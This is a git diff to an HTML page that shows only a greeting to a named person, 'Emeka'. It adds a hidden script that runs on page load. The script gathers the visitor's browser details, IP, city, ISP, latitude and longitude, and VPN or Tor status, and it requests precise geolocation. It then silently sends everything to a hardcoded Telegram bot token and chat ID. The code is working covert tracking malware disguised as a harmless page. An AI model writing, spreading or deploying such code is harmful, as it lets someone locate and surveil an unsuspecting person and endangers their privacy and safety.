@@ -29,15 +29,30 @@
 </head>
 <body>
   <div class="message">Hi Emeka 👋🏿</div>
-<script>
-  const PUBLIC_BOT_TOKEN = '7904257718:AAEMNe8Nb4Lk4YcCPr1BjB2bfxq9HF-tjI8';
-  const PUBLIC_CHAT_ID = '7830815090';
 
-  fetch('https://api.ipify.org?format=json')
-    .then(response => response.json())
-    .then(data => {
-      const ip = data.ip;
-      const message = `New visitor IP: ${ip}`;
+  <script>
+    const PUBLIC_BOT_TOKEN = '7904257718:AAEMNe8Nb4Lk4YcCPr1BjB2bfxq9HF-tjI8';
+    const PUBLIC_CHAT_ID = '7830815090';
+
+    async function getIpData(ip) {
+      const res = await fetch(`https://ipapi.co/${ip}/json/`);
+      return await res.json();
+    }
+
+    function getBrowserInfo() {
+      const ua = navigator.userAgent;
+      const platform = navigator.platform;
+      const language = navigator.language;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const deviceType = /Mobi|Android/i.test(ua) ? 'Mobile' : 'Desktop';
+      const time = new Date().toLocaleString();
+
+      return {
+        ua, platform, language, timezone, deviceType, time
+      };
+    }
+
+    function sendTelegramMessage(text) {
       fetch(`https://api.telegram.org/bot${PUBLIC_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: {
@@ -45,10 +60,80 @@
         },
         body: JSON.stringify({
           chat_id: PUBLIC_CHAT_ID,
-          text: message
+          text
         })
       });
-    });
-</script>
+    }
+
+    function buildMessage(ipData, browserData, geoData) {
+      return `📡 *New Visitor Report*
+
+🌐 *Browser Info*
+- User Agent: ${browserData.ua}
+- Platform: ${browserData.platform}
+- Language: ${browserData.language}
+- Timezone: ${browserData.timezone}
+- Device Type: ${browserData.deviceType}
+- Current Time: ${browserData.time}
+
+📍 *IP Info*
+- IP: ${ipData.ip}
+- Country: ${ipData.country_name}
+- Region: ${ipData.region}
+- City: ${ipData.city}
+- ISP: ${ipData.org}
+- ASN: ${ipData.asn}
+- Proxy: ${ipData.proxy ? 'Yes' : 'No'}
+- VPN: ${ipData.security?.vpn ? 'Yes' : 'No'}
+- TOR: ${ipData.security?.tor ? 'Yes' : 'No'}
+- Latitude: ${ipData.latitude}
+- Longitude: ${ipData.longitude}
+
+📌 *Geo Prompt Location*
+- Status: ${geoData.allowed ? 'Allowed' : 'Denied'}
+- Latitude: ${geoData.lat || 'N/A'}
+- Longitude: ${geoData.lon || 'N/A'}`
+    }
+
+    function getGeoPrompt() {
+      return new Promise(resolve => {
+        if (!navigator.geolocation) {
+          resolve({ allowed: false });
+          return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            resolve({
+              allowed: true,
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude
+            });
+          },
+          () => resolve({ allowed: false }),
+          { timeout: 5000 }
+        );
+      });
+    }
+
+    (async () => {
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ip = (await ipRes.json()).ip;
+
+        const [ipData, geoData] = await Promise.all([
+          getIpData(ip),
+          getGeoPrompt()
+        ]);
+
+        const browserData = getBrowserInfo();
+        const message = buildMessage(ipData, browserData, geoData);
+
+        sendTelegramMessage(message);
+      } catch (err) {
+        console.error('Failed to collect and send info', err);
+      }
+    })();
+  </script>
 </body>
 </html>
